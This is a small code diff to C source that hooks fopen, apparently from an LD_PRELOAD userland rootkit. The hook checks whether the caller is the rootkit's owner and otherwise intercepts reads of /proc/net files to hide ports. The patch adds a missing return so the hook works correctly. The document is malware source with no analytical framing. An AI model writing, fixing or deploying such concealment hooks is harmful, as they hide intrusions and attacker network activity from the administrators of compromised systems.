@@ -287,7 +287,7 @@ int access(const char *path, int amode) {
 FILE *fopen (const char *filename, const char *mode) {
 	DEBUG("fopen hooked %s.\n", filename);
 	if (is_owner()) 
-		syscall_list[SYS_FOPEN].syscall_func(filename, mode);
+		return syscall_list[SYS_FOPEN].syscall_func(filename, mode);
 
 	if (is_procnet(filename))
 		return hide_ports(filename);
